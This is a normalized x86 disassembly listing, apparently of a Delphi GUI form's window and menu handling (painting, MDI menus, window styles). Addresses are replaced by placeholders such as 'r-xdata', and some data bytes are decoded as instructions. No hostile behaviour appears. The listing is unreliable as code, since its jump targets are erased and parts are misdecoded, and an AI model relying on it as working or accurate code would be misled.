mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_459983
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_423870
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_45995c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_45993f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_423ee8
mov eax [ rw-data ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0xc ]
call sub_423d88
lea eax [ esi + 0x10 ]
push eax
lea ecx [ esi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459946
xor edx edx
mov eax [ ebp - 0xc ]
call sub_423ee8
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call RestoreDC
retn
push esi
call SetFocus
jmp r-xdata
call sub_446be4
mov esi eax
sub_459963
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_446be4
push eax
call ReleaseDC
retn
sub_459a14
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x274 ]
push eax
call CallWindowProcA
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_459a60
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_459f3c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_459f88
cmp [ eax + 0x22b ] 0x2
jne r-xdata
pop esi
pop ebx
pop ebp
retn
sub_459a9e
mov eax eax
push ebp
mov ebp esp
add esp 0xffffff8c
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
sub eax 0xf
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
sub eax 0x5
je r-xdata
xor eax eax
push ebp
push sub_459c6e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call BeginPaint
mov edx [ ebp - 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_423754
push eax
lea edx [ ebp - 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x6c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
sub eax 0x2b
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_444860
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call GetWindowRect
lea ecx [ ebp - 0x74 ]
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_43ff08
mov eax [ ebp - 0x74 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp - 0x70 ]
mov [ ebp - 0x58 ] eax
mov ecx [ ebp - 0x58 ]
neg ecx
mov edx [ ebp - 0x5c ]
neg edx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_43ed00
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
push ebp
call sub_459a14
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
sub eax 0x45
jne r-xdata
retn
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call EndPaint
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call GetClientRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_423754
push eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
call sub_459f3c
test eax eax
je r-xdata
push ebp
call sub_459a14
pop ecx
push ebp
call sub_459a14
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
mov dl 0x1
push ebp
call sub_459a60
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0xffffffff
jmp r-xdata
xor edx edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
call sub_456d80
jmp r-xdata
sub_459c80
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx eax
mov ecx esi
mov eax ebx
call sub_457f48
mov eax [ ebx + 0x254 ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x14
mov ecx [ esi + 0xc ]
mov edi [ esi + 0x4 ]
sub ecx edi
push ecx
mov ecx [ esi + 0x8 ]
mov edx [ esi ]
sub ecx edx
push ecx
push edi
push edx
push 0x1
push eax
call SetWindowPos
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
push esp
mov eax [ ebx + 0x254 ]
push eax
call GetClientRect
test eax eax
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebx + 0x254 ]
push eax
call InvalidateRect
sub_459cec
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax ebx
call sub_4585e4
mov eax ebx
call sub_446ee8
test al al
je r-xdata
mov eax ebx
call sub_4201fc
mov edi eax
dec edi
test edi edi
jl r-xdata
push 0xffffffec
mov eax ebx
call sub_446be4
push eax
call GetWindowLongA
and eax 0xffffefff
and eax 0xffffdfff
and eax 0xffffbfff
mov [ esp ] eax
mov edx esp
mov eax ebx
call sub_4439d0
mov eax [ esp ]
push eax
push 0xffffffec
mov eax ebx
call sub_446be4
push eax
call SetWindowLongA
pop edx
pop edi
pop esi
pop ebx
retn
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_4201d0
call sub_45419c
mov edx esi
mov eax ebx
call sub_4201d0
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
sub_459d84
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x244 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x244 ] 0x1
xor edx edx
push ebp
push sub_459e01
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x244 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
jne r-xdata
mov dl [ eax + 0x5f ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ rw-data ]
mov dl [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
jmp r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
sub_459e0c
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x228 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x228 ] al
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_44414c
sub_459e38
push esi
mov esi eax
cmp dl [ esi + 0x229 ]
je r-xdata
pop esi
retn
mov eax edx
mov [ esi + 0x229 ] al
sub al 0x2
je r-xdata
mov dl 0x1
sub al 0x3
je r-xdata
mov eax esi
call sub_44414c
xor edx edx
jmp r-xdata
mov eax esi
call sub_4580c4
test [ esi + 0x1c ] 0x10
jne r-xdata
sub_459e70
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov edi [ ebx + 0x30 ]
mov esi [ ebx + 0xa0 ]
mov ecx esp
mov eax ebx
call sub_43fbc8
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp edi eax
jne r-xdata
cmp esi [ ebx + 0xa0 ]
je r-xdata
mov eax ebx
call sub_44414c
sub_459eb4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0xa0 ]
je r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_43fcd4
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
test esi esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov al [ ebx + 0x229 ]
mov [ ebx + 0x280 ] al
mov [ ebx + 0x229 ] 0x0
mov al [ ebx + 0x280 ]
mov [ ebx + 0x229 ] al
jmp r-xdata
sub_459f08
push ebx
mov ebx eax
xor eax eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
pop ebx
retn
cmp [ ebx + 0x254 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x229
mov eax [ ebx + 0x254 ]
push eax
call SendMessageA
call sub_43d2a4
sub_459f3c
push ebx
push esi
push edi
xor edi edi
cmp [ eax + 0x22f ] 0x2
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x254 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_45daac
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
inc edi
mov edx esi
mov eax [ rw-data ]
call sub_45da98
cmp [ eax + 0x22f ] 0x1
jne r-xdata
sub_459f88
push ebx
push esi
push edi
mov edi edx
cmp [ eax + 0x22f ] 0x2
jne r-xdata
xor eax eax
cmp [ eax + 0x254 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_45daac
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
dec edi
test edi edi
jl r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_45da98
cmp [ eax + 0x22f ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_459fd8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov edx [ ebp + 0x8 ]
mov [ eax + 0x4 ] edx
mov edx [ ebx + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx eax
mov eax ebx
call sub_41a0dc
mov al 0x1
pop ebx
pop ebp
retn 0x10
sub_45a008
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov ebp rw-data
xor eax eax
mov [ esp ] eax
push 0x2
mov eax ebx
call sub_446be4
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi eax
mov eax [ ebp ]
call sub_45da7c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp ]
call sub_45da7c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
push eax
mov eax sub_459fd8
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp ]
call sub_45da7c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_45da68
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
mov edx esi
call sub_41a238
call sub_40324c
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_45da68
cmp edi [ eax + 0x4 ]
jne r-xdata
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_45da68
mov [ esp ] eax
jmp r-xdata
mov edx esi
mov eax [ ebp ]
call sub_45da68
cmp edi [ eax + 0x4 ]
jne r-xdata
sub_45a10c
push ebx
mov ebx eax
mov eax ebx
call sub_45a104
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x240 ]
call sub_429bb0
test eax eax
jne r-xdata
mov al 0x1
pop ebx
retn
sub_45a134
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x22f ]
je r-xdata
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
cmp [ esi + 0x230 ] 0x0
jne r-xdata
mov al [ esi + 0x22f ]
mov [ esi + 0x22f ] bl
cmp bl 0x2
je r-xdata
mov eax esi
call sub_444104
mov dl 0x1
mov eax esi
call sub_45a498
cmp [ esi + 0x1a5 ] 0x0
jne r-xdata
cmp al 0x2
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov eax esi
call sub_45a514
mov edx eax
mov eax esi
call sub_440564
cmp bl 0x1
jne r-xdata
mov eax esi
call sub_4442a0
mov dl 0x1
mov eax esi
call sub_4594b8
sub_45a1b4
push ebx
push esi
push edi
push ebp
mov ebp eax
cmp [ ebp + 0x22f ] 0x2
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x254 ] 0x0
je r-xdata
xor esi esi
mov eax [ ebp + 0x248 ]
test eax eax
je r-xdata
xor edi edi
mov eax [ ebp + 0x258 ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x34 ]
mov esi eax
mov eax ebp
call sub_446be4
push eax
call GetMenu
cmp esi eax
setne bl
push edi
push esi
push 0x230
mov eax [ ebp + 0x254 ]
push eax
call SendMessageA
test bl bl
je r-xdata
call sub_450798
mov edi eax
mov eax ebp
call sub_446be4
push eax
call DrawMenuBar
sub_45a230
push ebx
mov ebx edx
mov [ eax + 0x260 ] ebx
test ebx ebx
je r-xdata
pop ebx
retn
mov edx eax
mov eax ebx
call sub_41fca8
xor edx edx
mov eax ebx
call sub_452130
sub_45a254
push ebx
mov ebx eax
cmp edx [ ebx + 0x258 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x258 ] edx
test edx edx
je r-xdata
mov eax ebx
call sub_45a1b4
mov eax edx
mov edx ebx
call sub_41fca8
sub_45a27c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45a442
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
mov eax [ ebx + 0x248 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_45daac
dec eax
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x8
jne r-xdata
xor edx edx
call sub_453ce4
inc eax
mov [ ebp - 0x4 ] eax
xor edi edi
xor esi esi
test esi esi
je r-xdata
inc edi
dec [ ebp - 0x4 ]
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_45da98
cmp ebx eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
mov eax esi
call sub_41fca8
mov [ ebx + 0x248 ] esi
test esi esi
je r-xdata
test [ esi + 0x1c ] 0x8
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_45da98
cmp esi [ eax + 0x248 ]
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405eac
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b974
call sub_4039d8
mov eax ebx
call sub_446ee8
test al al
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x22e ] 0x0
je r-xdata
push 0x0
mov eax ebx
call sub_446be4
push eax
call SetMenu
mov eax [ ebx + 0x248 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
cmp [ ebx + 0x229 ] 0x3
je r-xdata
mov eax ebx
call sub_45a1b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a449
lea eax [ ebp - 0x10 ]
call sub_403f9c
retn
mov dl 0x1
mov eax ebx
call sub_45b340
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov eax ebx
call sub_446ee8
test al al
je r-xdata
mov eax ebx
call sub_446ee8
test al al
je r-xdata
mov eax [ ebx + 0x248 ]
mov edx [ eax ]
call [ edx + 0x34 ]
mov edi eax
mov eax ebx
call sub_446be4
push eax
call GetMenu
cmp edi eax
je r-xdata
push 0x0
mov eax ebx
call sub_446be4
push eax
call SetMenu
jmp r-xdata
mov eax ebx
call sub_446be4
mov edx eax
mov eax esi
call sub_453ce4
jmp r-xdata
mov eax [ ebx + 0x248 ]
mov edx [ eax ]
call [ edx + 0x34 ]
push eax
mov eax ebx
call sub_446be4
push eax
call SetMenu
sub_45a464
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_45a450
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
test [ ebx + 0x1c ] 0x1
je r-xdata
cmp esi 0x24
jl r-xdata
mov [ ebx + 0x25c ] esi
cmp [ ebx + 0x25c ] 0x0
je r-xdata
sub_45a4c0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_45a4b4
cmp bl al
je r-xdata
pop esi
pop ebx
retn
xor eax eax
mov [ esi + 0x25c ] eax
test bl bl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov [ esi + 0x25c ] eax
sub_45a52c
push ebx
mov ebx eax
mov eax ebx
call sub_4461c4
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x70 ] 0xff00000f
jne r-xdata
mov eax ebx
call sub_45a514
cmp eax [ ebx + 0x70 ]
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_45a514
mov edx eax
mov eax ebx
call sub_440564
mov edx 0xff00000f
mov eax ebx
call sub_440564
pop ebx
retn
sub_45a5b0
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x22b ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x22b ] bl
test [ esi + 0x1c ] 0x10
jne r-xdata
cmp [ esi + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
push eax
mov eax esi
call sub_446be4
push eax
call ShowWindow
sub_45a5f0
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx eax
mov al [ ebx + 0x231 ]
test al al
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
cmp [ edx + 0x44 ] 0x0
je r-xdata
xor edx edx
mov [ esp ] edx
cmp al 0x2
jne r-xdata
mov al [ ebx + 0x231 ]
cmp al 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_45a008
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
cmp al 0x1
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x68 ] 0x0
je r-xdata
mov eax ebx
call sub_45a008
mov eax [ eax + 0x4 ]
mov [ esp + 0x4 ] eax
mov eax [ rw-data ]
call sub_45da7c
dec eax
test eax eax
jl r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_45da68
mov eax [ eax + 0x4 ]
mov [ esp ] eax
mov eax [ rw-data ]
mov eax [ eax + 0x68 ]
call sub_45a008
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
inc eax
mov [ esp + 0x10 ] eax
xor esi esi
inc esi
dec [ esp + 0x10 ]
jne r-xdata
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_45da68
mov eax [ eax + 0x4 ]
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_45da7c
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
mov [ esp + 0x8 ] 0x0
inc [ esp + 0x8 ]
dec edi
jne r-xdata
mov al [ ebx + 0x230 ]
cmp al 0x4
jne r-xdata
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_45da68
mov eax [ eax + 0x4 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
cmp al 0x6
jne r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov ebp [ ebx + 0x4c ]
push ebp
mov edx esi
mov eax [ rw-data ]
call sub_45da68
call sub_45d76c
push eax
mov edx esi
mov eax [ rw-data ]
call sub_45da68
call sub_45d750
sub eax ebp
sar eax 0x1
jns r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_45da68
call sub_45d738
mov ebp eax
add ebp [ ebx + 0x40 ]
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_45da68
call sub_45d738
sub ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_45da68
call sub_45d738
push eax
mov edx esi
mov eax [ rw-data ]
call sub_45da68
call sub_45d784
pop edx
add edx eax
mov eax [ ebx + 0x48 ]
add eax ebp
cmp edx eax
jge r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov ebp [ ebx + 0x4c ]
push ebp
mov edx esi
mov eax [ rw-data ]
call sub_45da68
call sub_45d76c
push eax
mov edx esi
mov eax [ rw-data ]
call sub_45da68
call sub_45d750
sub eax ebp
sar eax 0x1
jns r-xdata
pop edx
add edx eax
push edx
mov edx esi
mov eax [ rw-data ]
call sub_45da68
call sub_45d738
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_45da68
call sub_45d784
sub eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
mov edx esi
mov eax [ rw-data ]
call sub_45da68
call sub_45d76c
add eax [ ebx + 0x44 ]
push eax
mov edx [ esp + 0xc ]
mov eax [ rw-data ]
call sub_45da68
call sub_45d76c
pop edx
sub edx eax
mov [ esp + 0xc ] edx
mov edx esi
mov eax [ rw-data ]
call sub_45da68
call sub_45d76c
push eax
mov edx esi
mov eax [ rw-data ]
call sub_45da68
call sub_45d750
pop edx
add edx eax
mov eax [ esp + 0xc ]
add eax [ ebx + 0x4c ]
cmp edx eax
jge r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_45da68
call sub_45d738
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_45da68
call sub_45d784
add ebp eax
sub ebp [ ebx + 0x48 ]
pop edx
add edx eax
push edx
mov edx esi
mov eax [ rw-data ]
call sub_45da68
call sub_45d738
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_45da68
call sub_45d784
sub eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
add ebp eax
mov edx ebp
mov eax ebx
pop ecx
mov ebp [ eax ]
call [ ebp + 0x84 ]
jmp r-xdata
adc eax 0x0
mov eax [ ebx + 0x48 ]
push eax
mov eax [ ebx + 0x4c ]
push eax
mov ecx [ esp + 0x14 ]
mov edx ebp
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x84 ]
mov edx esi
mov eax [ rw-data ]
call sub_45da68
call sub_45d76c
push eax
mov edx esi
mov eax [ rw-data ]
call sub_45da68
call sub_45d750
pop edx
add edx eax
sub edx [ ebx + 0x4c ]
mov [ esp + 0xc ] edx
add ebp eax
mov edx ebp
mov eax ebx
pop ecx
mov ebp [ eax ]
call [ ebp + 0x84 ]
jmp r-xdata
adc eax 0x0
sub_45a944
push ebx
push esi
push edi
push ecx
mov esi edx
mov edi eax
mov edx esi
mov eax edi
call sub_457ef8
mov edx esi
mov eax edi
call sub_45d2e8
cmp [ edi + 0x30 ] 0x0
jne r-xdata
mov [ esi + 0x24 ] 0x8
test [ edi + 0x1c ] 0x10
je r-xdata
cmp [ edi + 0x190 ] 0x0
jne r-xdata
mov al [ edi + 0x230 ]
dec eax
sub al 0x2
jae r-xdata
cmp [ edi + 0x30 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x1c ] eax
and [ esi + 0x4 ] 0xbffcffff
mov bl [ edi + 0x228 ]
mov al [ edi + 0x229 ]
mov [ esp ] al
cmp [ edi + 0x22f ] 0x1
jne r-xdata
mov [ esi + 0xc ] 0x80000000
mov [ esi + 0x10 ] 0x80000000
or [ esi + 0x4 ] 0xcf0000
jmp r-xdata
xor eax eax
mov al [ esp ]
cmp eax 0x5
ja r-xdata
mov al [ esp ]
test al al
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
add al 0xfc
sub al 0x2
jae r-xdata
jmp [ eax * 4 + jump_table_45a9f3 ]
mov [ esp ] 0x2
sub al 0x3
jne r-xdata
mov al [ esp ]
sub al 0x3
jae r-xdata
mov [ esi + 0x8 ] 0x80
lea edx [ esi + 0x8 ]
mov eax edi
call sub_4439d0
mov al [ r-xdata ]
and al bl
mov ebx eax
cmp [ edi + 0x30 ] 0x0
jne r-xdata
or [ esi + 0x4 ] 0xc00000
jmp r-xdata
or [ esi + 0x4 ] 0xc40000
mov al [ edi + 0x230 ]
sub al 0x1
je r-xdata
mov eax [ esi + 0x4 ]
or eax 0x80000000
or eax 0xc00000
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] 0x101
lea edx [ esi + 0x8 ]
mov eax edi
call sub_4439d0
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov [ edi + 0x22b ] 0x0
cmp [ edi + 0x22f ] 0x1
jne r-xdata
mov bl [ r-xdata ]
jmp r-xdata
cmp [ edi + 0x190 ] 0x0
jne r-xdata
mov [ esi + 0x14 ] 0x80000000
mov [ esi + 0x18 ] 0x80000000
jmp r-xdata
sub al 0x2
jne r-xdata
mov al [ r-xdata ]
and al bl
mov ebx eax
mov [ esi + 0x24 ] 0x2808
mov eax [ esi + 0x4 ]
or eax __dos_header
or eax 0x80
mov [ esi + 0x4 ] eax
test bl 0x8
je r-xdata
or [ esi + 0x4 ] 0x80000
test bl 0x2
je r-xdata
test bl 0x1
je r-xdata
or [ esi + 0x4 ] 0x80000000
test [ edi + 0x1d ] 0x2
je r-xdata
or [ esi + 0x8 ] 0x400
test bl 0x4
je r-xdata
or [ esi + 0x4 ] 0x20000
mov al [ edi + 0x22b ]
cmp al 0x1
jne r-xdata
cmp [ edi + 0x22f ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff3fffff
or [ esi + 0x4 ] 0x10000
cmp al 0x2
jne r-xdata
or [ esi + 0x4 ] 0x20000000
jmp r-xdata
mov eax r-xdata
mov [ esi + 0x28 ] eax
test bl 0x1
je r-xdata
or [ esi + 0x4 ] 0x1000000
jmp r-xdata
sub_45ab55
add [ eax ] al
add [ ecx ] cl
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_457f08
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x229 ] 0x3
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov al [ ebx + 0x22f ]
sub al 0x2
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax ebx
call sub_446be4
push eax
call SendMessageA
mov eax ebx
call sub_45b4b4
push eax
push 0x1
push 0x80
mov eax ebx
call sub_446be4
push eax
call SendMessageA
jmp r-xdata
mov [ esp + 0x4 ] 0xff00
xor eax eax
mov [ esp ] eax
mov esi [ ebx + 0x258 ]
test esi esi
je r-xdata
dec al
